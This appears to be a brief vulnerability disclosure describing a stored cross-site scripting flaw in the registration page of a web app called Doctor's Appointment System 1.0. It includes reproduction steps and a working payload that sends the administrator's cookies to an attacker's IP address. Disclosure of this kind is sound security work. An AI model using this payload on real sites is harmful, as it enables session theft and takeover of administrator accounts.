### Version: 1.0

## CVE: 
-  **Description:** Doctor's Appointment System 1.0 is vulnerable to Cross Site Scripting (XSS) through the registration page. A client can craft a malicious payload, when the administrator goes to the "user menu" the payload will be executed and the administrator's cookies will be sent to the attacker's server.

### Steps to reproduce:
- 1- Go to [http://localhost/doctors_appointment/](http://localhost/doctors_appointment/)
- 2- Select the option to create an account, here we place the payload we want:

```javascript
<img src=x onerror=this.src='http://10.0.0.158/?c='+document.cookie>
```
